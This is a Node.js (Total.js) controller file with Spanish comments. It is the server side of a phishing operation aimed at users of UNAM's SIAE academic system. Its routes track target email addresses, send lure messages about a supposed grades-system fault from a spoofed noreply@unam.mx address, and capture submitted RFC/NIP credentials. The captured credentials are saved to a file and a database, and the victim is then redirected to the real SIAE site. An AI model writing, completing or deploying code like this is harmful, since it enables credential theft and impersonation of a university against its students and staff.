const pool = require('../models/database.js'); // Ajusta según tu proyecto
// Si usas F.mail, MAIL, o definiciones en la configuración, ajusta la importación:
const fs = require('fs');

exports.install = function() {
    // Rutas API
    ROUTE('/api/emails', getEmails, ['GET']);
    ROUTE('/api/emails', addEmail, ['POST']);

    // Enviar correo con la plantilla mails/siae
    ROUTE('POST /new-email', send_email);

    // Guardar credenciales (cuando el usuario ingrese su RFC/NIP)
    ROUTE('POST /www_gate', save_credentials);
};

// ==============================
//     1) GET /api/emails
// ==============================
// Con async/await:
async function getEmails() {
    const self = this;
    const query = `SELECT id, email, visto, click, user, password FROM correos`;

    try {
        // pool.query(...) en la versión PROMISE devuelve un array: [rows, fields]
        let [rows] = await pool.query(query); 
        self.json(rows);
    } catch (err) {
        console.error('Error al consultar correos:', err);
        self.throw500(err);
    }
}

// ==============================
//     2) POST /api/emails
// ==============================
async function addEmail() {
    let self = this;
    let data = self.body; // { email: '...', ... }

    // Valida que data.email no esté vacío, por ejemplo
    if (!data.email) {
        return self.throw400('El email es requerido');
    }

    // Query para insertar
    const query = `
        INSERT INTO correos (email, visto, click, user, password)
        VALUES (?, ?, ?, ?, ?)
    `;

    try {
        let [result] = await pool.query(query, [
            data.email,
            0,            // visto=0
            'off',        // click='off'
            '',           // user=''
            ''            // password=''
        ]);
        // Responder al cliente:
        self.json({ success: true, insertedId: result.insertId });
    } catch (err) {
        console.error('Error al insertar correo:', err);
        self.throw500(err);
    }
}

// ==============================
//     3) POST /new-email
// ==============================
async function send_email() {
    let self = this;
    let body = self.body; // { email: 'el_correo_que_envió_el_front' }

    // Datos del correo a enviar:
    // Ponemos 'body.email' como destinatario
    let obj = {
        email: body.email,
        subject: 'Revisión de Falla en el SIAE - Actualización de Calificaciones',
        route: 'mails/siae', // Plantilla que usaremos
        from: CONF.mail_address_from || 'noreply@unam.mx'
    };

    // MAIL(...) es la forma que Total.js provee para enviar correos
    // Asegúrate de haber configurado MAIL en la configuración.
    MAIL(obj.email, obj.subject, obj.route, obj, (err, res) => {
        if (err) {
            console.error('Error al enviar correo:', err);
            return self.throw500(err);
        }
        // Enviamos respuesta exitosa al front
        self.json({ success: true });
    }).from(obj.from);
}

// ==============================
//     4) POST /www_gate
// ==============================
async function save_credentials() {
    let self = this;
    let body = self.body;
    // usr_logi (RFC o usuario), usr_pass (NIP), y por querystring se manda '?email='
    //  -> Ejemplo: <form action="www_gate?email=persona@example.com" method="post">

    let email = self.query.email; 
    let { usr_logi, usr_pass } = body;

    // 4.1) OPCIONAL: Guardar en archivo input.txt (como en tu ejemplo)
    try {
        const fd = fs.openSync("input.txt", "r+");
        fs.writeSync(fd, `${usr_logi} ${usr_pass}`, 0, 'utf8');
        fs.closeSync(fd);
    } catch (e) {
        console.error("Error al escribir en input.txt:", e);
    }

    // 4.2) Actualizar base de datos (credenciales + click='on') para el correo que coincida
    try {
        const query = `
            UPDATE correos
            SET user = ?, password = ?, click = 'on'
            WHERE email = ?
        `;
        await pool.query(query, [usr_logi, usr_pass, email]);

        // 4.3) Redirigir a la URL final (o a "SIAE" oficial)
        self.redirect('https://www.dgae-siae.unam.mx/www_gate.php');
    } catch (err) {
        console.error("Error al actualizar credenciales en la BD:", err);
        return self.throw500(err);
    }
}